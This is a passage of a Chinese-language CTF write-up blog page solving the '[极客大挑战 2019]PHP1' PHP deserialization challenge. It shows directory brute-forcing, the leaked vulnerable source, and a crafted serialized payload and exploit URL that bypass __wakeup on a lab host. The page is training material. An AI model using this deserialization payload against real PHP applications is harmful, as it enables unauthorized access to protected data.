+</span></span><span class="line"><span class="cl">            <span class="nx">flag</span> <span class="o">+=</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">print</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="c1"># 最后得到路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"># flag_fecd0d9b-2852-497d-b829-0c5bf11c5021
+</span></span></span></code></pre></div><h3 id="极客大挑战-2019-php1">[极客大挑战 2019]PHP1</h3>
+<p>猫猫真不错，但是不能给flag啊 <!-- raw HTML omitted --></p>
+<p>根据文字提示，直接先用dirsearch爆破一下目录看看有没有备份文件 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">./</span><span class="nx">dirsearch</span><span class="o">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">http</span><span class="o">://</span><span class="mi">63038</span><span class="nx">eb9</span><span class="o">-</span><span class="nx">d80a</span><span class="o">-</span><span class="mi">4</span><span class="nx">dba</span><span class="o">-</span><span class="nx">ac04</span><span class="o">-</span><span class="nx">c7cc6f1b1592</span><span class="o">.</span><span class="nx">node4</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">81</span><span class="o">/</span> <span class="o">-</span><span class="nx">e</span> <span class="nx">php</span>
+</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-06-19_15-59-30_screenshot.png"
+         alt="Figure 2: 利用dirsearch找到备份文件" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->利用dirsearch找到备份文件</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>接着我们下载该文件 <!-- raw HTML omitted --></p>
+<p>解压缩后就发现了网页的所有备份文件 <!-- raw HTML omitted --></p>
+<p>index.php <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s1">&#39;class.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$select</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;select&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$res</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="o">@</span><span class="nv">$select</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>class.php <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Name</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;nonono&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s1">&#39;yesyes&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;You name is: &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">;</span><span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;You password is: &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">;</span><span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>看到这些魔术方法我们自然就想到要构建 POP链来进行反序列化调用 <!-- raw HTML omitted --></p>
+<p>只要__destruct() 的时候满足 $this-&gt;username = &lsquo;admin&rsquo;, $this-&gt;password = 100 即可输出flag，但是 __wakeup() 却会在一开始就修改 $this-&gt;username 的值，因此我们要想办法绕过 __wakeup() <!-- raw HTML omitted --></p>
+<p>在反序列化字符串时，如果一个对象申明的属性个数大于实际个数时，就会自动跳过 __wakeup() 的执行，我们构造payload <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Name</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="o">=</span><span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$s</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">urlencode</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-06-19_16-24-46_screenshot.png"
+         alt="Figure 3: Payload serialisation payload" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->Payload serialisation payload</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>接着我们修改申明的属性个数 <!-- raw HTML omitted -->
+O%3A4%3A%22Name%2 <code>3</code> %3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://63038eb9-d80a-4dba-ac04-c7cc6f1b1592.node4.buuoj.cn:81/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
+</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-06-19_16-29-09_screenshot.png"
+         alt="Figure 4: 得到Flag！" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->得到Flag！</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>参考：[[<a class="link" href="https://segmentfault.com/a/1190000022534926"  target="_blank" rel="noopener"
+    >https://segmentfault.com/a/1190000022534926</a>][CTF-Web-[极客大挑战 2019]PHP <!-- raw HTML omitted --></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">ctf</a>
+        
+            <a href="/tags/web_security/">web_security</a>
+        
+            <a href="/tags/php/">php</a>
+        
+            <a href="/tags/unserialize/">unserialize</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Jun 19, 2022 23:54 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/sqli_labs_study/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sqli-labs Study: Basic Challenges</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/pwnthebox_web_easy/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Pwn The Box WEB-Easy</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/mr_robot/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mr. Robot writeup</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/php_serialize_unserialize/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 序列化与反序列化</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/php_bypass_query_string_parser/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">如何利用PHP查询字符串解释器来绕过IDPS以及WAF</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;
+        
+        2022 Under The Ginkgo
+    </section>
+
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <section class="powerby">
+      <span id="busuanzi_container_site_pv" style='display:none'>
+        Viwe <span id="busuanzi_value_site_pv"></span> times
+      </span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#php-反序列化实例练习">PHP 反序列化实例练习</a>
+      <ul>
+        <li><a href="#实例1">实例1</a></li>
+        <li><a href="#极客大挑战-2019-php1">[极客大挑战 2019]PHP1</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
